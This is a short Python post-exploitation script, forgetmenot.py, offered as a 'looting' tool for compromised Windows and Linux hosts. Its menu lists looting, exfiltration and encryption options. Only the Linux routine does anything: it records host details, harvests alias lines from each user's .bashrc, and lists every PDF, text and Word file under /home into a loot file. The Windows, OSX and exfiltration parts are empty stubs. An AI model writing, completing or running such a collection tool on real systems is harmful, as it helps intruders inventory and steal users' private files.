import re, sys, os, platform
import ipaddress
from subprocess import Popen, PIPE

#
#       forgetmenot.py
#               a local looting Python script for Windows and Linux hosts
#
#       Eric Valenzuela, eevn.io
#       June 16, 2017
#

### Main Menu --start--
def mainmenu():
    print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Compression/ Encryption Options\n   4: Exit')
    try:
        mitem = None
        while mitem != 4:
            try:
                mitem = input('fmn_$>')
            except SyntaxError:
                mitem = None
            if mitem == 4:
                print('Exiting')
                return
            elif mitem == 1:
                lootme_stub()
            elif mitem == 2:
                print(2)
            elif mitem == 3:
                print(3)
            else:
                print("Invalid Selection.")
                mitem = None
    except SystemError:
        print('Runtime error:')
        for i in sys.exc_info():
            print(i)
    return
### Main Menu --end--

### lootme --start--
def lootme_stub():
    if platform.system() == 'Windows':
        print('Running on Windows...')
        lootme_windows()
    elif platform.system() == 'Linux':
        print('Running on Linux...')
        lootme_linux()
    elif platform.system() == 'OSX':
        print('Running on OSX')
        lootme_osx()
    else:
        print('OS not recognized. Exiting.')
    return
### lootme --end--

### lootme_windows --start--
def lootme_windows():
    return
### lootme_windows --end--

### lootme_linux --start--
def lootme_linux():
    userdirs = os.listdir('/home/')
    hostloot = (platform.uname()[1]+'_loot.txt')
    with open(hostloot, 'w') as outFile:
        outFile.write('Machine info:\n')
        outFile.write(platform.uname()[1]+'\n'+platform.system()+'\n'+platform.release()+'\n'+platform.version()+'\n')
        for d in userdirs:
            outFile.write('\nUser: '+d+'\n')
            with open(('/home/'+str(d)+'/.bashrc'), 'r') as bashrc:
                outFile.write('\n.bashrc file:\n')
                content = bashrc.readlines()
                for line in content:
                    if re.match('[.]*alias [.]*', line):
                        outFile.write(line)
            outFile.write('\nFiles discovered:')
            for path, subdirs, files in os.walk('/home/'+d):
                for name in files:
                    if re.search('[.]*\.pdf', name) or re.search('[.]*\.txt', name) or re.search('[.]*\.doc[.]{1}', name):
                       outFile.write('\n'+os.path.join(path, name)) 
    return
### lootme_linux --end--

### lootme_osx --start--
def lootme_osx():
    return
### lootme_osx --end--

### Program init --start--
mainmenu()
